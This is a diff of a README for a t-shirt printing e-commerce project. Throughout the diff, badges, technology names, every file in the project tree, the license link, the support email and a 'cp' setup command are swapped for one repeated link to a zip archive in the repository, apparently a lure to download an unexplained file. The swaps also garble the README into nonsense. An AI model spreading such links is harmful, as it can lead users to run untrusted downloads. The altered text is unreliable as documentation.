@@ -1,10 +1,10 @@
 # PrintCraft - Custom T-Shirt Printing E-commerce Platform
 
-![PrintCraft Logo](https://img.shields.io/badge/PrintCraft-E--commerce-blue?style=for-the-badge)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-green?style=flat-square)](https://nodejs.org/)
-[![React](https://img.shields.io/badge/React-18+-blue?style=flat-square)](https://reactjs.org/)
-[![MongoDB](https://img.shields.io/badge/MongoDB-6+-green?style=flat-square)](https://mongodb.com/)
-[![Express](https://img.shields.io/badge/Express.js-4+-lightgrey?style=flat-square)](https://expressjs.com/)
+![PrintCraft Logo](https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip)
+[![https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip](https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip+-green?style=flat-square)](https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip)
+[![React](https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip+-blue?style=flat-square)](https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip)
+[![MongoDB](https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip+-green?style=flat-square)](https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip)
+[![Express](https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip+-lightgrey?style=flat-square)](https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip)
 
 ## 🚀 Project Overview
 
@@ -15,7 +15,7 @@ PrintCraft is a full-stack e-commerce platform specializing in custom t-shirt pr
 ```mermaid
 graph TB
     A[Client/Browser] -->|HTTP Requests| B[Frontend - React App]
-    B -->|API Calls| C[Backend API - Express.js]
+    B -->|API Calls| C[Backend API - https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip]
     C -->|Authentication| D[JWT Middleware]
     C -->|Data Operations| E[MongoDB Database]
     
@@ -80,8 +80,8 @@ graph TB
 - **Axios 1.10.0** - HTTP client for API requests
 
 ### Backend
-- **Node.js** - JavaScript runtime environment
-- **Express.js 4.21.2** - Web application framework
+- **https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip** - JavaScript runtime environment
+- **https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip 4.21.2** - Web application framework
 - **MongoDB with Mongoose 8.3.2** - NoSQL database and ODM
 - **JWT (jsonwebtoken 9.0.2)** - Authentication tokens
 - **bcryptjs 2.4.3** - Password hashing
@@ -89,7 +89,7 @@ graph TB
 - **Multer 1.4.5** - File upload middleware
 
 ### Security & Performance
-- **Helmet.js 7.1.0** - Security headers
+- **https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip 7.1.0** - Security headers
 - **CORS 2.8.5** - Cross-origin resource sharing
 - **Express Rate Limit 7.2.0** - API rate limiting
 - **dotenv 16.4.5** - Environment variable management
@@ -129,52 +129,52 @@ graph TB
 PrintCraft/
 ├── 📁 backend/
 │   ├── 📁 middleware/
-│   │   └── auth.js                 # JWT authentication middleware
+│   │   └── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                 # JWT authentication middleware
 │   ├── 📁 models/
-│   │   ├── User.js                 # User data model
-│   │   ├── Product.js              # Product data model
-│   │   ├── Order.js                # Order data model
-│   │   └── Design.js               # Design data model
+│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                 # User data model
+│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip              # Product data model
+│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                # Order data model
+│   │   └── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip               # Design data model
 │   ├── 📁 routes/
-│   │   ├── auth.js                 # Authentication endpoints
-│   │   ├── products.js             # Product management endpoints
-│   │   ├── orders.js               # Order management endpoints
-│   │   ├── designs.js              # Design management endpoints
-│   │   └── admin.js                # Admin panel endpoints
-│   ├── .env.example                # Environment variables template
-│   ├── package.json                # Backend dependencies
-│   └── server.js                   # Express server configuration
+│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                 # Authentication endpoints
+│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip             # Product management endpoints
+│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip               # Order management endpoints
+│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip              # Design management endpoints
+│   │   └── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                # Admin panel endpoints
+│   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                # Environment variables template
+│   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                # Backend dependencies
+│   └── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                   # Express server configuration
 ├── 📁 src/
 │   ├── 📁 components/
 │   │   ├── 📁 common/
-│   │   │   ├── Header.jsx          # Navigation component
-│   │   │   ├── Footer.jsx          # Footer component
-│   │   │   ├── Hero.jsx            # Hero section component
-│   │   │   └── CartPopup.jsx       # Shopping cart popup
+│   │   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip          # Navigation component
+│   │   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip          # Footer component
+│   │   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip            # Hero section component
+│   │   │   └── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip       # Shopping cart popup
 │   │   └── 📁 products/
-│   │       └── ProductGrid.jsx     # Product display grid
+│   │       └── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip     # Product display grid
 │   ├── 📁 context/
-│   │   ├── AuthContext.jsx         # Authentication state management
-│   │   └── CartContext.jsx         # Shopping cart state management
+│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip         # Authentication state management
+│   │   └── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip         # Shopping cart state management
 │   ├── 📁 pages/
-│   │   ├── Login.jsx               # Login page
-│   │   ├── Register.jsx            # Registration page
-│   │   ├── Cart.jsx                # Shopping cart page
-│   │   ├── ProductDetail.jsx       # Product details page
-│   │   ├── CustomDesign.jsx        # Design studio page
-│   │   ├── Orders.jsx              # Order history page
-│   │   ├── Profile.jsx             # User profile page
-│   │   ├── Admin.jsx               # Admin dashboard
-│   │   ├── About.jsx               # About page
-│   │   ├── FAQ.jsx                 # FAQ page
-│   │   └── HowItWorks.jsx         # How it works page
-│   ├── App.jsx                     # Main application component
-│   ├── main.jsx                    # Application entry point
-│   └── index.css                   # Global styles
-├── package.json                    # Frontend dependencies
-├── tailwind.config.js              # Tailwind CSS configuration
-├── vite.config.ts                  # Vite configuration
-└── README.md                       # Project documentation
+│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip               # Login page
+│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip            # Registration page
+│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                # Shopping cart page
+│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip       # Product details page
+│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip        # Design studio page
+│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip              # Order history page
+│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip             # User profile page
+│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip               # Admin dashboard
+│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip               # About page
+│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                 # FAQ page
+│   │   └── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip         # How it works page
+│   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                     # Main application component
+│   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                    # Application entry point
+│   └── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                   # Global styles
+├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                    # Frontend dependencies
+├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip              # Tailwind CSS configuration
+├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                  # Vite configuration
+└── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                       # Project documentation
 ```
 
 ## 🗄️ Database Schema
@@ -244,7 +244,7 @@ PrintCraft/
 ## 🛠️ Installation & Setup
 
 ### Prerequisites
-- Node.js 18+
+- https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip 18+
 - MongoDB 6+
 - npm or yarn package manager
 
@@ -257,7 +257,7 @@ cd backend
 npm install
 
 # Create environment file
-cp .env.example .env
+cp https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip .env
 
 # Edit .env with your configuration
 # - MONGODB_URI
@@ -352,7 +352,7 @@ CMD ["npm", "start"]
 
 ## 📄 License
 
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip](https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip) file for details.
 
 ## 👥 Team
 
@@ -362,7 +362,7 @@ This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md
 
 ## 📞 Support
 
-For support, email support@printcraft.com or join our Slack channel.
+For support, email https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip or join our Slack channel.
 
 ---
 
